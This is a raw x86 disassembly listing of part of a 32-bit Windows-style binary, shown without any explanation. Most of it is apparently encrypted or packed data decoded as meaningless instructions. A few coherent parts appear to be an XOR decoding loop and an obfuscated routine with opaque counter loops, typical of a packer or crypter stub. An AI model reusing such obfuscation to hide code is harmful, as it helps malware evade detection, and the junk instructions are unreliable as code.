  402989:	dec    ebp
  40298a:	out    0x92,eax
  40298c:	sbb    DWORD PTR ds:0xb0410ad8,esi
  402992:	fmul   DWORD PTR [esp+eax*2+0x66012e04]
  402999:	rol    edi,1
  40299b:	pop    ss
  40299c:	fbstp  TBYTE PTR [ecx+0x44]
  40299f:	cld    
  4029a0:	ret    
  4029a1:	pop    ss
  4029a2:	xlat   BYTE PTR ds:[ebx]
  4029a3:	in     al,dx
  4029a4:	cs add edx,esp
  4029a7:	mov    ebp,0x1a206206
  4029ac:	addr16 js 0x4029c8
  4029af:	aas    
  4029b0:	cmp    DWORD PTR [ecx+0x44],edx
  4029b3:	js     0x4029e6
  4029b5:	aaa    
  4029b6:	sbb    eax,0x44c4e6a9
  4029bb:	xor    DWORD PTR [ebx],esp
  4029bd:	iret   
  4029be:	pusha  
  4029bf:	inc    ebp
  4029c0:	push   ecx
  4029c1:	push   edx
  4029c2:	lods   al,BYTE PTR ds:[esi]
  4029c3:	or     eax,0xdf66dfe2
  4029c8:	cmp    BYTE PTR [ecx-0x77],cl
  4029cb:	mov    bh,0x11
  4029cd:	cs jmp 0x4029e4
  4029d0:	arpl   WORD PTR [edx+0x3c5c3f28],bx
  4029d6:	jbe    0x402a2d
  4029d8:	add    esi,DWORD PTR [ecx]
  4029da:	dec    ecx
  4029db:	jb     0x402995
  4029dd:	test   DWORD PTR [edx],ebx
  4029df:	pop    eax
  4029e0:	cmc    
  4029e1:	mov    ebx,0xa3aeaddc
  4029e6:	mov    dh,0x85
  4029e8:	fild   QWORD PTR [edx-0x508c61fb]
  4029ee:	adc    eax,0x295512c5
  4029f3:	sbb    al,0xd
  4029f5:	and    eax,DWORD PTR [edi]
  4029f7:	call   0xb603dc2b
  4029fc:	push   ebx
  4029fd:	iret   
  4029fe:	mov    cl,0x91
  402a00:	bnd jo 0x402a51
  402a03:	hlt    
  402a04:	loope  0x402a2e
  402a06:	xchg   ebx,eax
  402a07:	test   BYTE PTR [edx+ebx*4],0x6a
  402a0b:	sbb    ah,bh
  402a0d:	les    eax,FWORD PTR [ebx]
  402a0f:	jge    0x402a21
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x3f18e180,al
  402a42:	fisubr DWORD PTR [eax+0xc]
  402a45:	jle    0x402ac5
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a31
  402a4c:	pop    DWORD PTR [ecx]
  402a4e:	adc    al,0xfb
  402a50:	cmp    BYTE PTR [eax],al
  402a52:	push   eax
  402a53:	xchg   ebp,eax
  402a54:	jb     0x402a31
  402a56:	jmp    0x402ac9
  402a58:	into   
  402a59:	or     BYTE PTR [ebx+0x6c],ch
  402a5c:	push   es
  402a5d:	cmp    al,0xee
  402a5f:	sar    DWORD PTR [esi-0x5883c051],0xc9
  402a66:	ret    0x936c
  402a69:	jns    0x402a55
  402a6b:	sub    cl,bl
  402a6d:	into   
  402a6e:	mov    ?,WORD PTR [eax+0x646b77dc]
  402a74:	icebp  
  402a75:	dec    esp
  402a76:	or     ecx,esp
  402a78:	leave  
  402a79:	sahf   
  402a7a:	jle    0x402a65
  402a7c:	lock int3 
  402a7e:	mov    esi,0x9393bd1b
  402a83:	pusha  
  402a84:	icebp  
  402a85:	out    dx,eax
  402a86:	arpl   WORD PTR [ebp+0x71],si
  402a89:	out    dx,eax
  402a8a:	inc    ebx
  402a8b:	cli    
  402a8c:	int    0x39
  402a8e:	jne    0x402b03
  402a90:	cmc    
  402a91:	inc    esp
  402a92:	bound  ecx,QWORD PTR [ecx+0x5c9b758b]
  402a98:	stos   BYTE PTR es:[edi],al
  402a99:	daa    
  402a9a:	mov    edx,0x9ec64fcc
  402a9f:	clc    
  402aa0:	mov    eax,0xceef6ed3
  402aa5:	push   edi
  402aa6:	cmp    DWORD PTR [ebp+0x6f],esi
  402aa9:	push   eax
  402aaa:	mov    dh,0x5d
  402aac:	aaa    
  402aad:	lea    ebx,[edx+0xe9cc5ca]
  402ab3:	iret   
  402ab4:	cmp    BYTE PTR [edi+eax*4],0x8d
  402ab8:	xchg   ecx,eax
  402ab9:	xor    ebp,esp
  402abb:	mov    ah,0xcb
  402abd:	clc    
  402abe:	ret    0x462a
  402ac1:	lock jae 0x402a94
  402ac4:	and    edx,edi
  402ac6:	push   gs
  402ac8:	popa   
  402ac9:	sbb    DWORD PTR [ecx],edi
  402acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402acc:	retf   
  402acd:	mov    cl,0x36
  402acf:	outs   dx,BYTE PTR ds:[esi]
  402ad0:	test   al,0x71
  402ad2:	test   al,0x18
  402ad4:	cmp    eax,0x432a4e1a
  402ad9:	mov    dh,0xac
  402adb:	pop    ebp
  402adc:	sub    DWORD PTR [ecx+0x4c594a1a],0x44284cde
  402ae6:	pop    es
  402ae7:	pushf  
  402ae8:	add    BYTE PTR [edx-0x79d306ff],dl
  402aee:	push   ebx
  402aef:	add    eax,0xf0ff483
  402af4:	jle    0x402b59
  402af6:	(bad)  
  402af7:	mov    eax,ds:0x6a9363a
  402afc:	sbb    BYTE PTR [esi+ecx*2],cl
  402aff:	lock push edx
  402b01:	mov    bl,BYTE PTR [esi]
  402b03:	mov    esi,0x10707a2b
  402b08:	mov    ch,0x4
  402b0a:	xchg   ebp,eax
  402b0b:	aad    0xdd
  402b0d:	mov    ah,0x8f
  402b0f:	bound  esp,QWORD PTR [ebx-0x79]
  402b12:	or     al,0x8
  402b14:	ja     0x402ae1
  402b16:	es push es
  402b18:	cdq    
  402b19:	add    DWORD PTR [esi+0x59],eax
  402b1c:	ficom  DWORD PTR [ecx+0x6607fae0]
  402b22:	sub    eax,0x4fe9d337
  402b27:	popa   
  402b28:	popf   
  402b29:	dec    ecx
  402b2a:	jb     0x402b8e
  402b2c:	jg     0x402b49
  402b2e:	cmp    ecx,DWORD PTR [eax]
  402b30:	push   esi
  402b31:	stc    
  402b32:	dec    ebp
  402b33:	dec    esi
  402b34:	leave  
  402b35:	fidivr WORD PTR [ebx+0x601a39b9]
  402b3b:	sbb    bl,BYTE PTR [edx]
  402b3d:	add    dh,BYTE PTR [eax-0x77]
  402b40:	push   0x7f0884ea
  402b45:	daa    
  402b46:	xchg   ecx,eax
  402b47:	outs   dx,DWORD PTR ds:[esi]
  402b48:	mov    eax,0x6cea2263
  402b4d:	in     eax,dx
  402b4e:	out    0x1,eax
  402b50:	pop    ds
  402b51:	icebp  
  402b52:	xchg   ebx,eax
  402b53:	add    DWORD PTR [edx+eax*4+0x30],edx
  402b57:	lods   al,BYTE PTR ds:[esi]
  402b58:	jo     0x402b83
  402b5a:	mov    edi,DWORD PTR [eax+ecx*4+0xd36a5be]
  402b61:	(bad)  
  402b62:	xchg   esi,eax
  402b63:	imul   esp,DWORD PTR [eax+0x34e8ce49],0xffffff85
  402b6a:	daa    
  402b6b:	dec    ebp
  402b6c:	jp     0x402bb1
  402b6e:	fadd   st,st(1)
  402b70:	pop    edi
  402b71:	cmp    DWORD PTR [edi+0x27],edx
  402b74:	stos   DWORD PTR es:[edi],eax
  402b75:	outs   dx,DWORD PTR ds:[esi]
  402b76:	sub    BYTE PTR [esi],0x66
  402b79:	pop    ebp
  402b7a:	arpl   WORD PTR [ebp-0x3c390f08],ax
  402b80:	mov    ds:0xc17127c9,eax
  402b85:	inc    edi
  402b86:	dec    ecx
  402b87:	mov    edi,0xc37c7f57
  402b8c:	adc    bl,BYTE PTR [ecx]
  402b8e:	mov    edi,0x9b1d1b12
  402b93:	jp     0x402bd7
  402b95:	arpl   WORD PTR [esi],cx
  402b97:	cdq    
  402b98:	mov    dl,BYTE PTR [edi]
  402b9a:	psadbw mm0,mm5
  402b9d:	pop    edi
  402b9e:	dec    edx
  402b9f:	pop    ss
  402ba0:	pop    edi
  402ba1:	xchg   ebx,eax
  402ba2:	push   esi
  402ba3:	lock cmc 
  402ba5:	ret    0x8fa0
  402ba8:	mov    ebx,0xbf568983
  402bad:	mov    ds:0xcc9c4b12,eax
  402bb2:	mov    WORD PTR [ebx],?
  402bb4:	mov    esi,0x8140e457
  402bb9:	xor    BYTE PTR [eax-0x10047f5f],cl
  402bbf:	rcl    BYTE PTR [esi],0x45
  402bc2:	fs stos BYTE PTR es:[edi],al
  402bc4:	iret   
  402bc5:	cmp    al,0x61
  402bc7:	retf   
  402bc8:	(bad)  
  402bc9:	mov    esp,0x307ce837
  402bce:	xor    al,0xa9
  402bd0:	and    ebx,0xffffffaa
  402bd3:	pop    esp
  402bd4:	rcl    DWORD PTR [ebx-0x67],1
  402bd7:	ins    BYTE PTR es:[edi],dx
  402bd8:	and    edi,DWORD PTR [edi]
  402bda:	and    eax,0xea971eff
  402bdf:	mov    WORD PTR [ecx],es
  402be1:	mov    esi,0x1609708a
  402be6:	pop    edi
  402be7:	cs push ebp
  402be9:	push   esp
  402bea:	push   edx
  402beb:	ret    0x2706
  402bee:	sub    cl,0xf6
  402bf1:	(bad)  
  402bf2:	fisub  DWORD PTR [esi]
  402bf4:	sbb    DWORD PTR [edi],0x3e96be33
  402bfa:	cs ins BYTE PTR es:[edi],dx
  402bfc:	xchg   ebx,eax
  402bfd:	add    BYTE PTR [esi-0x48],dh
  402c00:	jns    0x402c6f
  402c02:	lahf   
  402c03:	jmp    0xc063:0x7906dc2e
  402c0a:	or     al,0x25
  402c0c:	fld    st(7)
  402c0e:	fldenv [eax]
  402c10:	bound  edx,QWORD PTR [ebx+0x58]
  402c13:	push   ss
  402c14:	nop
  402c15:	or     DWORD PTR [esi+edx*1-0x5d],eax
  402c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c1a:	jmp    0x402c40
  402c1c:	out    0x9c,eax
  402c1e:	std    
  402c1f:	push   ebp
  402c20:	retf   
  402c21:	pop    ecx
  402c22:	adc    bl,dl
  402c24:	pandn  mm6,QWORD PTR [ebx]
  402c27:	stc    
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x3b
  402c6b:	icebp  
  402c6c:	std    
  402c6d:	jb     0x402cbe
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c8d
  402c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c78:	fs retf 
  402c7a:	and    eax,0xba0634a9
  402c7f:	fist   WORD PTR [eax-0x52]
  402c82:	out    dx,eax
  402c83:	sub    bh,BYTE PTR [ebx-0x7302134b]
  402c89:	inc    ebx
  402c8a:	or     BYTE PTR [ebp-0x22],ch
  402c8d:	or     ah,BYTE PTR [esi+esi*2]
  402c90:	inc    eax
  402c91:	cwde   
  402c92:	or     eax,0xc1bd172d
  402c97:	(bad)  
  402c98:	ja     0x402cf4
  402c9a:	ret    0xdc00
  402c9d:	cmp    al,0xf8
  402c9f:	and    al,0xe
  402ca1:	inc    ebp
  402ca2:	add    ecx,ebx
  402ca4:	int    0x8a
  402ca6:	int    0x53
  402ca8:	rcr    DWORD PTR fs:[edi-0x63f614b],0x8e
  402cb0:	imul   eax
  402cb2:	push   es
  402cb3:	xor    DWORD PTR [ebx+0x7dc49fc],0x77
  402cba:	daa    
  402cbb:	push   edi
  402cbc:	xchg   esp,eax
  402cbd:	dec    edx
  402cbe:	xchg   cl,bh
  402cc0:	or     al,0x52
  402cc2:	mov    eax,0xb81394ac
  402cc7:	popf   
  402cc8:	(bad)  
  402cc9:	int3   
  402cca:	mul    cl
  402ccc:	dec    edx
  402ccd:	popf   
  402cce:	jle    0x402ced
  402cd0:	jg     0x402d08
  402cd2:	adc    ebp,ebp
  402cd4:	mov    ecx,0x578efcc1
  402cd9:	gs daa 
  402cdb:	sub    esp,edx
  402cdd:	rcl    bl,1
  402cdf:	inc    ah
  402ce1:	pop    edi
  402ce2:	fnstcw WORD PTR [edx+ecx*8]
  402ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ce6:	jge    0x402cfe
  402ce8:	pop    ds
  402ce9:	mov    dh,0xe1
  402ceb:	sar    DWORD PTR [ebp+0x400dfd0c],0x52
  402cf2:	retf   
  402cf3:	mul    BYTE PTR [edi-0x44757c8b]
  402cf9:	sbb    BYTE PTR [ecx-0xe],bh
  402cfc:	ss js  0x402cbc
  402cff:	sets   BYTE PTR [ecx+0x326ee0a1]
  402d06:	jns    0x402d80
  402d08:	cmp    eax,0xf99079c3
  402d0d:	call   0xb8ffd73c
  402d12:	push   0x37
  402d14:	iret   
  402d15:	pop    ebx
  402d16:	sbb    al,0x9e
  402d18:	ja     0x402d1f
  402d1a:	jg     0x402d47
  402d1c:	scas   al,BYTE PTR es:[edi]
  402d1d:	xchg   ebx,eax
  402d1e:	fwait
  402d1f:	lods   al,BYTE PTR ds:[esi]
  402d20:	dec    BYTE PTR [edx+0xd9c5efd]
  402d26:	sub    al,0x75
  402d28:	push   ds
  402d29:	push   cs
  402d2a:	mov    edi,0x9721cfbf
  402d2f:	daa    
  402d30:	in     eax,0x63
  402d32:	ret    
  402d33:	cdq    
  402d34:	pop    esp
  402d35:	mov    bh,0x4b
  402d37:	push   ebp
  402d38:	xchg   edx,eax
  402d39:	cld    
  402d3a:	mov    bl,0x64
  402d3c:	inc    ebp
  402d3d:	jg     0x402d6e
  402d3f:	sub    dh,BYTE PTR [eax+0x57]
  402d42:	ins    BYTE PTR es:[edi],dx
  402d43:	dec    edx
  402d44:	pushf  
  402d45:	pop    ebp
  402d46:	xchg   DWORD PTR [edi+0x4c],eax
  402d49:	(bad)  
  402d4a:	mov    al,0x7a
  402d4c:	mov    dh,0xf6
  402d4e:	jmp    0x402d53
  402d50:	cmp    bl,BYTE PTR [eax-0x9]
  402d53:	push   esp
  402d54:	test   al,0x33
  402d56:	xor    eax,0x7a66bca4
  402d5b:	nop
  402d5c:	xchg   ecx,eax
  402d5d:	pop    eax
  402d5e:	inc    esp
  402d5f:	out    0xe5,al
  402d61:	call   0x30849ee2
  402d66:	lds    esi,FWORD PTR [edi+0x324cc7b7]
  402d6c:	dec    ebx
  402d6d:	sti    
  402d6e:	cmp    BYTE PTR fs:[esi+0xa80de2],dh
  402d75:	int    0xc1
  402d77:	xor    eax,0x67d96969
  402d7c:	sub    edx,ebx
  402d7e:	cmp    eax,0x99e53157
  402d83:	sbb    eax,0x1da89de8
  402d88:	mov    ds:0x1a62daa0,al
  402d8d:	pop    ebx
  402d8e:	mov    ebp,0x3ba95f2b
  402d93:	jmp    0x3857:0x71e28e88
  402d9a:	sbb    edi,edi
  402d9c:	pop    eax
  402d9d:	xchg   BYTE PTR [esi-0x28632b5],dl
  402da3:	cmp    ebx,DWORD PTR ds:0xdab2bbc2
  402da9:	rcr    BYTE PTR [ebx+0x17],cl
  402dac:	popa   
  402dad:	pop    esp
  402dae:	test   BYTE PTR [ebp-0x1bfc594a],dl
  402db4:	adc    al,0x8a
  402db6:	aaa    
  402db7:	icebp  
  402db8:	loopne 0x402d41
  402dba:	es mov dh,0x1a
  402dbd:	mov    ebx,DWORD PTR [ebx+0x7f]
  402dc0:	jb     0x402daf
  402dc2:	add    eax,0xdd6f62c2
  402dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dc8:	jo     0x402d5e
  402dca:	hlt    
  402dcb:	jnp    0x402e01
  402dcd:	out    0x66,eax
  402dcf:	stos   BYTE PTR es:[edi],al
  402dd0:	xchg   edx,eax
  402dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dd2:	sti    
  402dd3:	push   ebp
  402dd4:	out    dx,al
  402dd5:	je     0x402e50
  402dd7:	push   esi
  402dd8:	push   es
  402dd9:	push   esi
  402dda:	or     DWORD PTR [ebx],edx
  402ddc:	psadbw mm7,QWORD PTR [ebx]
  402ddf:	jp     0x402e3a
  402de1:	and    eax,0x622d5c43
  402de6:	dec    eax
  402de7:	mov    eax,0x6e3f62e3
  402dec:	in     eax,dx
  402ded:	or     BYTE PTR [edx],ah
  402def:	mov    ch,0x83
  402df1:	xor    DWORD PTR [esi+edi*8+0x2a],edx
  402df5:	xchg   esp,eax
  402df6:	cwde   
  402df7:	clc    
  402df8:	fmul   DWORD PTR [esi]
  402dfa:	fxch   st(5)
  402dfc:	inc    eax
  402dfd:	jp     0x402e2c
  402dff:	adc    al,0x5a
  402e01:	inc    ecx
  402e02:	cbw    
  402e04:	cmc    
  402e05:	sahf   
  402e06:	shl    DWORD PTR [ebp-0x7edae856],0x11
  402e0d:	test   eax,0xefc24ca5
  402e12:	mov    ebp,0xcd72adba
  402e17:	xor    cl,0x4
  402e1a:	push   cs
  402e1b:	stos   DWORD PTR es:[edi],eax
  402e1c:	repz mov esp,DWORD PTR [edx+0x3123cb3a]
  402e23:	aad    0x8d
  402e25:	jno    0x402db4
  402e27:	push   es
  402e28:	dec    eax
  402e29:	je     0x402e07
  402e2b:	xchg   ebp,eax
  402e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e2d:	test   al,0x1c
  402e2f:	pop    ds
  402e30:	adc    eax,0xb52e727b
  402e35:	ror    edi,1
  402e37:	sub    eax,0x7ad92084
  402e3c:	adc    BYTE PTR [eax-0x4c],al
  402e3f:	ret    0x2b28
  402e42:	jmp    0x402e41
  402e44:	add    esp,DWORD PTR [edx+0x5f0fbd37]
  402e4a:	push   0x75
  402e4c:	mov    ebx,ebp
  402e4e:	add    al,0x9b
  402e50:	scas   eax,DWORD PTR es:[edi]
  402e51:	add    esi,DWORD PTR [ebp+0x10]
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e7d0,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x430435
  402e91:	xor    ecx,DWORD PTR ds:0x42edd3
  402e97:	mov    DWORD PTR ds:0x430435,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42edef,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42edef
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42edef,ecx
  402ec9:	cmp    DWORD PTR ds:0x42edef,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42edef,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42ea9b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ede7,0x17
  402efd:	cmp    DWORD PTR ds:0x42ede7,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ede7,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x430449
  402f21:	push   0x42e8b7
  402f26:	call   DWORD PTR ds:0x42e9b3
  402f2c:	cmp    DWORD PTR ds:0x42ede7,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ede7
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ede7,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ede7
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ede7,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42edcf,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42edcf
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42edcf,ecx
  402f71:	cmp    DWORD PTR ds:0x42edcf,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x43046d
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e9c7
  402f8f:	cmp    DWORD PTR ds:0x42edcf,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42edcb,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x430455,0x10
  402faf:	cmp    DWORD PTR ds:0x430455,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x430455,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e82d
  402fd4:	call   DWORD PTR ds:0x42e9cb
  402fda:	cmp    DWORD PTR ds:0x430455,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x430455
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x430455,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x430455
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x430455,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x43046d,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e7c0
  403019:	add    DWORD PTR ds:0x42edf3,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x4304db,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e7c8,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	fnstcw WORD PTR [edx+0x63]
  403052:	retf   
  403053:	mov    ds:0xae7e7e08,al
  403058:	jg     0x4030d8
  40305a:	jle    0x403000
  40305c:	je     0x40301d
  40305e:	rcl    BYTE PTR [ebp-0x12],1
  403061:	sub    edx,DWORD PTR [esi]
  403063:	es push eax
  403065:	jno    0x403045
  403067:	mov    dl,0xbf
  403069:	loopne 0x4030da
  40306b:	or     DWORD PTR [eax+0x10adb30e],edi
  403071:	mov    al,BYTE PTR [esi+0x2]
  403074:	mov    ds:0x293273fd,eax
  403079:	ins    DWORD PTR es:[edi],dx
  40307a:	push   ebx
  40307b:	mov    ebx,esp
  40307d:	loope  0x403057
  40307f:	retf   
  403080:	(bad)  
  403081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403082:	in     al,dx
  403083:	dec    edi
  403084:	xchg   ecx,eax
  403085:	cmp    al,0x8
  403087:	adc    DWORD PTR [eax+0x5db7fd28],edi
  40308d:	das    
  40308e:	aad    0x56
  403090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403091:	push   ds
  403092:	jecxz  0x4030a0
  403094:	not    ch
  403096:	pop    ds
  403097:	imul   edx,DWORD PTR [eax-0x44e08d2a],0x7ee524d7
  4030a1:	icebp  
  4030a2:	aaa    
  4030a3:	sbb    dl,BYTE PTR [ebp-0x519cb7b5]
  4030a9:	xchg   ebp,eax
  4030aa:	or     eax,0xf7acdc9b
  4030af:	sub    DWORD PTR [ebp-0x2d],edx
  4030b2:	lods   eax,DWORD PTR ds:[esi]
  4030b3:	or     cl,BYTE PTR [ebx+0x51]
  4030b6:	xor    al,0x51
  4030b8:	arpl   WORD PTR [ebp+0x15],di
  4030bb:	jbe    0x40304d
  4030bd:	loop   0x403124
  4030bf:	push   ecx
  4030c0:	dec    esp
  4030c1:	shl    DWORD PTR [ebx],1
  4030c3:	inc    DWORD PTR [ebx+0x1e98eb43]
  4030c9:	dec    edx
  4030ca:	inc    ebp
  4030cb:	jge    0x403125
  4030cd:	iret   
  4030ce:	jno    0x4030e6
  4030d0:	and    eax,0x842223e8
  4030d5:	pavgb  mm2,QWORD PTR [esi]
  4030d8:	mov    esp,0xd469182b
  4030dd:	shr    DWORD PTR [esi-0x3fe0a6c8],cl
  4030e3:	int3   
  4030e4:	push   0xa32d7a51
  4030e9:	std    
  4030ea:	icebp  
  4030eb:	cmp    cl,0xe6
  4030ee:	cmp    al,0x43
  4030f0:	sahf   
  4030f1:	sbb    eax,0x194cfcb5
  4030f6:	cmp    ebx,DWORD PTR [esi-0x28]
  4030f9:	sub    BYTE PTR [edx+0x31a417d2],dh
  4030ff:	lea    ebp,[eax-0x5]
  403102:	fcomp  DWORD PTR [esi-0x67]
  403105:	in     eax,0xd9
  403107:	aaa    
  403108:	xor    BYTE PTR [ebp+0x6d299609],ah
  40310e:	clc    
  40310f:	jge    0x40316f
  403111:	xor    al,0x86
  403113:	(bad)  
  403114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403115:	clc    
  403116:	pop    esp
  403117:	clc    
  403118:	push   esp
  403119:	push   ebx
  40311a:	and    esi,edx
  40311c:	jne    0x40318a
  40311e:	mov    eax,gs:0x7064e76d
  403124:	xchg   ebx,eax
  403125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403126:	push   esi
  403127:	fs push edi
  403129:	xchg   ebp,eax
  40312a:	(bad)  
  40312b:	cmp    al,dh
  40312d:	xor    BYTE PTR [ebx-0x46],0xd1
  403131:	call   0x85b1:0xef2c0adc
  403138:	mov    edi,0xae7f3e80
  40313d:	mov    esi,0xf1694c24
  403142:	or     BYTE PTR [ecx-0x1a],0x92
  403146:	dec    esi
  403147:	pushf  
  403148:	aaa    
  403149:	mov    ?,esp
  40314b:	popa   
  40314c:	inc    eax
  40314d:	mov    edx,0xc434ca6a
  403152:	bound  esi,QWORD PTR [ecx]
  403154:	retf   0x7880
  403157:	jne    0x40319b
  403159:	sbb    esp,DWORD PTR [ecx-0x6bc950d1]
  40315f:	and    esi,DWORD PTR [esi]
  403161:	call   0xca39:0xafbe5080
  403168:	enter  0x80a9,0x16
  40316c:	inc    esi
  40316d:	jb     0x4031c2
  40316f:	sbb    DWORD PTR [edx+esi*4],edi
  403172:	loop   0x4031ab
  403174:	in     al,dx
  403175:	jecxz  0x4031b7
  403177:	ds scas eax,DWORD PTR es:[edi]
  403179:	mov    ebp,0x313972bf
  40317e:	or     BYTE PTR [edi+0x71],dl
  403181:	call   0x192a:0x4992562f
  403188:	push   0xffffff9d
  40318a:	sub    ah,BYTE PTR [ecx+0x6d]
  40318d:	bound  ecx,QWORD PTR [ecx+0x3893623e]
  403193:	(bad)  
  403194:	int3   
  403195:	pop    es
  403196:	and    BYTE PTR [ebp-0x54d1e72b],0x8a
  40319d:	scas   eax,DWORD PTR es:[edi]
  40319e:	xchg   ebp,eax
  40319f:	sub    edx,DWORD PTR [ecx-0x7f3861c8]
  4031a5:	ret    
  4031a6:	or     esi,DWORD PTR [ecx]
  4031a8:	sbb    BYTE PTR ds:0x6dd2daf1,0x80
  4031af:	adc    BYTE PTR [esi],dl
  4031b1:	call   0x3a15:0xf2442844
  4031b8:	sub    ch,BYTE PTR [edx-0x72]
  4031bb:	sti    
  4031bc:	gs (bad) 
  4031be:	mov    ebp,0xc2a49e50
  4031c3:	gs addr16 dec edi
  4031c6:	add    al,0x47
  4031c8:	stos   BYTE PTR es:[edi],al
  4031c9:	lods   eax,DWORD PTR ds:[esi]
  4031ca:	pop    esp
  4031cb:	adc    cl,BYTE PTR [ebx+ebp*8]
  4031ce:	adc    eax,0x6f94f281
  4031d3:	loop   0x403208
  4031d5:	ins    DWORD PTR es:[edi],dx
  4031d6:	xor    al,0xa4
  4031d8:	sbb    al,0x94
  4031da:	stc    
  4031db:	inc    esi
  4031dc:	xor    BYTE PTR [ebp+0x2b],ch
  4031df:	imul   eax,DWORD PTR [ebp+0x56],0xffffff83
  4031e3:	arpl   WORD PTR [ecx],bp
  4031e5:	add    al,0x59
  4031e7:	aaa    
  4031e8:	outs   dx,BYTE PTR ds:[esi]
  4031e9:	daa    
  4031ea:	rol    ecx,cl
  4031ec:	pop    ss
  4031ed:	in     al,0x6a
  4031ef:	jmp    FWORD PTR [eax]
